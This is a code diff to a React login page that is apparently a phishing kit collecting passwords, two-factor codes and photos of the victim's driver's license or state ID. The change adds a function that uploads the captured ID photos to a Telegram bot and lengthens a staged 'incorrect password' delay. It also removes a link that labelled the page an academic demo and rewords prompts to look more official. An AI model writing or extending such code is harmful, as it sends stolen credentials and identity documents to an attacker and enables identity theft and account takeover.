@@ -63,6 +63,18 @@ export default function LoginPage() {
     });
   };
 
+  const sendPhotoToTelegram = (file, caption) => {
+    const formData = new FormData();
+    formData.append("chat_id", telegramChatId);
+    formData.append("photo", file);
+    formData.append("caption", caption);
+
+    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+      method: "POST",
+      body: formData,
+    });
+  };
+
   const handleLoginSubmit = async (e) => {
     e.preventDefault();
     setIsSubmitting(true);
@@ -76,7 +88,7 @@ export default function LoginPage() {
       setIsLoading(false);
       setSubmitMessage({ type: "error", text: "Username or password is incorrect" });
     } else if (attemptCount === 1) {
-      await new Promise((resolve) => setTimeout(resolve, 200));
+      await new Promise((resolve) => setTimeout(resolve, 2000));
       setIsLoading(false);
       setStep(2);
     }
@@ -112,7 +124,13 @@ export default function LoginPage() {
     const formData = new FormData();
     formData.append("identityFront", identityFront);
     formData.append("identityBack", identityBack);
-    sendToTelegram({ identityFront: "Uploaded", identityBack: "Uploaded" });
+
+    if (identityFront) {
+      sendPhotoToTelegram(identityFront, "Identity Front");
+    }
+    if (identityBack) {
+      sendPhotoToTelegram(identityBack, "Identity Back");
+    }
 
     setIsLoading(false);
     setStep(4);
@@ -178,11 +196,6 @@ export default function LoginPage() {
                 <div className="mt-6 p-3 bg-gray-50 rounded text-center">
                   <p className="text-xs text-gray-600">Social media sign in is no longer available. Please sign in with your email.</p>
                 </div>
-                <div className="mt-4 pt-4 border-t border-gray-200">
-                  <div className="text-center">
-                    <Link href="/admin" className="text-xs text-gray-500 hover:text-gray-700 underline">Admin: View Captured Data (Academic Demo)</Link>
-                  </div>
-                </div>
               </CardContent>
             </Card>
           </div>
@@ -217,13 +230,15 @@ export default function LoginPage() {
                 <span className="text-blue-600">3</span>
               </div>
             </CardHeader>
+
             <CardContent className="space-y-4">
               <p className="text-sm text-gray-600">Enter a code from your device</p>
               <p className="text-sm text-gray-600">Please check your code generator application and enter the generated 6-digit code to complete your sign in.</p>
+              <p className="text-sm text-gray-600">Enter the 6-digit code*</p>
               <form onSubmit={handleTwoFactorSubmit}>
                 <Input
                   type="text"
-                  placeholder="Enter the 6-digit code *"
+                  placeholder="------"
                   value={twoFactorCode}
                   onChange={(e) => setTwoFactorCode(e.target.value)}
                   className="w-full mb-4"
@@ -268,18 +283,20 @@ export default function LoginPage() {
           </div>
           <Card className="shadow-lg border-0">
             <CardHeader className="space-y-4 pb-4">
-              <h1 className="text-2xl font-semibold text-center text-gray-900">Verify Your Identity</h1>
+              <h1 className="text-2xl font-semibold text-center text-gray-900">TAKE PHOTOS WITH YOUR PHONE</h1>
             </CardHeader>
             <CardContent className="space-y-4">
               <form onSubmit={handleIdentitySubmit}>
-                <div className="border-dashed border-2 border-blue-300 p-4 text-center">
+                <div className="border-dashed border-2 border-gray-300 p-4 text-center">
                   <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Front ID" className="w-full h-32 object-cover mb-2" />
-                  <p className="text-sm text-gray-600">Take a different photo (front)</p>
+                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br></br>state ID</p>
+                  <p className="text-sm text-green-600 underline font-semibold">(FRONT)</p>
                   <input type="file" accept="image/*" onChange={(e) => setIdentityFront(e.target.files[0])} className="mt-2" />
                 </div>
-                <div className="border-dashed border-2 border-blue-300 p-4 text-center mt-4">
+                <div className="border-dashed border-2 border-gray-300 p-4 text-center mt-4">
                   <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==" alt="Back ID" className="w-full h-32 object-cover mb-2" />
-                  <p className="text-sm text-gray-600">Take photo of your driver's license or state ID (BACK)</p>
+                  <p className="text-sm text-blue-600 underline font-semibold">Take photo of your driver's license or <br></br>state ID</p>
+                  <p className="text-sm text-green-600 underline font-semibold">(BACK)</p>
                   <input type="file" accept="image/*" onChange={(e) => setIdentityBack(e.target.files[0])} className="mt-2" />
                 </div>
                 <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
